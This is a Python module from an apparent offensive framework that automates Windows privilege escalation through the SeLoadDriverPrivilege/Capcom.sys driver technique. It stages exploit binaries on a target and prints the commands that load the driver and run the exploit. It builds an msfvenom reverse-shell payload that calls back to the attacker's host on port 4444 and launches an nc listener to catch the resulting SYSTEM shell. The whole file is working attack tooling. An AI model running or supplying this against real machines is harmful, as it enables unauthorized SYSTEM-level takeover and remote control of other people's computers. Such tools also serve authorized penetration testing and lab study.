import subprocess
from pathlib import Path

from modules.upload.windows import stage_windows_files
from core.attacker import resolve_lhost

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

EXPLOIT_DIR = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "drivers"
)

PAYLOAD_DIR = (
    BASE_DIR /
    "payloads" /
    "windows" /
    "drivers"
)

PAYLOAD_DIR.mkdir(
    parents=True,
    exist_ok=True,
)

CAPCOM = EXPLOIT_DIR / "Capcom.sys"

EOP = EXPLOIT_DIR / "EoPLoadDriver.exe"

EXPLOIT = EXPLOIT_DIR / "ExploitCapcom.exe"

EXPLOITREV = EXPLOIT_DIR / "ExploitCapcomRev.exe"

# =========================================================
# HELPERS
# =========================================================

def start_listener(port):

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"nc -lvnp {port}"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"Listener started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start listener:{W} {e}"
        )

        return False


def check_build():

    try:

        build = input(
            f"\n{B}build/version{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return True

    if not build:
        return True

    try:

        if "." in build:

            build = build.split(".")[-1]

        build = int(build)

    except Exception:

        return True

    print(
        f"\n{B}[*]{W} "
        f"TARGET\n"
    )

    print(
        f"  {B}├──{W} "
        f"Build: {build}"
    )

    if build >= 17134:

        print(
            f"\n{R}[!] "
            f"Windows 10 1803+ "
            f"is patched against this technique.{W}"
        )

        return True

    print(
        f"\n{G}[+] "
        f"Target appears vulnerable.{W}"
    )

    return True


# =========================================================
# MENU
# =========================================================

def render_menu():

    print(
        f"\n{B}[*]{W} "
        f"LOAD DRIVER ATTACKS\n"
    )

    print(
        f"  {B}├──{W} [1] SYSTEM shell"
    )

    print(
        f"  {B}├──{W} [2] Reverse shell"
    )

    print(
        f"  {B}└──{W} [3] Cleanup"
    )


# =========================================================
# SYSTEM SHELL
# =========================================================

def system_shell_flow():

    files = [

        str(CAPCOM),
        str(EOP),
        str(EXPLOIT),

    ]

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_files(files)

    print(
        f"\n{G}"
        f"┌── LOAD DRIVER "
        f"────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"EoPLoadDriver.exe "
        f"System\\CurrentControlSet\\Capcom "
        f"Capcom.sys"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}"
        f"┌── EXPLOIT "
        f"────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"ExploitCapcom.exe"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── EXPECTED RESULT "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"NT AUTHORITY\\SYSTEM shell"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# REVSHELL
# =========================================================

def revshell_flow(args):

    lhost = resolve_lhost(args)

    lport = 4444

    if not lhost or not lport:
        return

    payload = EXPLOIT_DIR / "revshell.exe"
    cmd = [

        "msfvenom",

        "-p",
        "windows/x64/shell_reverse_tcp",

        f"LHOST={lhost}",
        f"LPORT={lport}",

        "-f",
        "exe",

        "-o",
        str(payload),

    ]

    print(
        f"\n{B}[*]{W} "
        f"GENERATING PAYLOAD"
    )

    try:

        subprocess.run(
            cmd,
            check=True,
        )

    except Exception as e:

        print(
            f"\n{R}[!] "
            f"msfvenom failed:{W} {e}"
        )

        return

    print(
        f"\n{G}[+] Payload generated:{W}"
    )

    print(f"  {payload}")

    # =====================================================
    # LISTENER
    # =====================================================

    start_listener(lport)

    # =====================================================
    # TRANSFER
    # =====================================================

    files = [

        str(payload),
        str(CAPCOM),
        str(EOP),
        str(EXPLOITREV),
    ]

    print(
        f"\n{B}[*]{W} "
        f"STARTING TRANSFER"
    )

    stage_windows_files(files)

    # =====================================================
    # LOAD DRIVER
    # =====================================================

    print(
        f"\n{G}"
        f"┌── LOAD DRIVER "
        f"────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"EoPLoadDriver.exe "
        f"System\\CurrentControlSet\\Capcom "
        f"Capcom.sys"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # PATCH NOTE
    # =====================================================

    print(
        f"\n{Y}"
        f"┌── IMPORTANT "
        f"──────────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"modify ExploitCapcom.cpp line 292"
    )

    print(
        f"{Y}│{W} "
        f"replace cmd.exe with:"
    )

    print(
        f"{Y}│{W} "
        f"C:\\ProgramData\\revshell.exe"
    )

    print(
        f"{Y}│{W} "
        f"then recompile ExploitCapcomRev.exe"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    # =====================================================
    # EXECUTION
    # =====================================================

    print(
        f"\n{G}"
        f"┌── EXECUTE "
        f"────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"ExploitCapcom.exe"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{Y}"
        f"┌── EXPECTED RESULT "
        f"────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"SYSTEM reverse shell callback"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# CLEANUP
# =========================================================

def cleanup_flow():

    print(
        f"\n{G}"
        f"┌── REMOVE DRIVER KEY "
        f"──────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"reg delete "
        f"HKCU\\System\\CurrentControlSet\\Capcom"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] WINDOWS LOAD DRIVER ABUSE{W}"
    )

    if not check_build():

        return data

    render_menu()

    try:

        choice = input(
            f"\n{B}select{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return data

    # =====================================================
    # SYSTEM
    # =====================================================

    if choice == "1":

        system_shell_flow()

    # =====================================================
    # REVSHELL
    # =====================================================

    elif choice == "2":

        revshell_flow(args)

    # =====================================================
    # CLEANUP
    # =====================================================

    elif choice == "3":

        cleanup_flow()

    return data
